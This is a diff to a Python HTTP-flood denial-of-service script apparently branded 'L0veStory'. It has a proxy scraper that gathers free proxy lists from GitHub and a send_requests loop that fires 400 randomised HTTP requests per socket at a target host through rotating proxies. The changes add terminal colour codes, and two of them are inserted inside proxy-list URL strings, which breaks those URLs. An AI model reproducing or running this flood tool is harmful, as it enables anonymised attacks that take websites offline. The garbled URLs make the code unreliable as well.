@@ -360,7 +360,7 @@ def ProxyScraper(): # Proxy scraping , # Regarding proxy scraping—having done 
                     download_proxy.append(lines)        
     
     git_proxy_list = [                 #Github proxies is suck, so don't use it
-            "https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies_anonymous/http.txt",
+            "\033[38;5;22mhttps://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies_anonymous/http.txt",
             "https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies/http.txt",
             "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/http.txt",
             "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/https.txt",
@@ -371,7 +371,7 @@ def ProxyScraper(): # Proxy scraping , # Regarding proxy scraping—having done 
             "https://raw.githubusercontent.com/sunny9577/proxy-scraper/refs/heads/master/generated/http_proxies.txt",
             "https://raw.githubusercontent.com/roosterkid/openproxylist/refs/heads/main/HTTPS_RAW.txt",
             "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/refs/heads/master/http.txt",
-            "https://raw.githubusercontent.com/r00tee/Proxy-List/refs/heads/main/Https.txt"
+            "https://raw.githubusercontent.com/r00tee/Proxy-List/refs/heads/main/Https.txt\033[0m"
     ]
 
     proxifly = "https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/protocols/http/data.txt"
@@ -399,7 +399,7 @@ def ProxyScraper(): # Proxy scraping , # Regarding proxy scraping—having done 
         host = u.split(".com/")[1]
         r = requests.get(u)
         if r.status_code == 200:
-            print(f"[L0veStory]=>status: \033[32;1m{r.status_code}\033[0m \033[36m{host}\033[0m")
+            print(f"\033[38;5;220m[L0veStory]=>status: \033[32;1m{r.status_code}\033[0m \033[36m{host}\033[0m")
             lst = r.text.split("\n")
             for lines in lst:
                 if len(lines) > 10 and len(lines) < 22:
@@ -451,9 +451,9 @@ def send_requests(): #TraditionHTTP FLOOD
             try:
                 for _ in range(400):
                     s.send(f"{method} {path}?{rC(string)}={rInt(1,99999)}{rC(rand)} HTTP/1.1\r\nHost: {host}\r\n{header}".encode())
-                print(f"[L0veStory]=>Stress \033[36m{host}\033[0m From: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
+                print(f"\033[38;5;220m[L0veStory]=>Stress \033[36m{host}\033[0m From: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
             except:
-                print(f"[L0veStory]=>Proxy: \033[35;1m{proxy_ip}:{proxy_port}\033[0m request \033[31;1mFailed\033[0m")
+                print(f"\033[38;5;220m[L0veStory]=>Proxy: \033[35;1m{proxy_ip}:{proxy_port}\033[0m request \033[31;1mFailed\033[0m")
                 s.close()
                 proxy_ip, proxy_port = random.choice(good_proxies).split(":")
                 proxy_port = int(proxy_port)
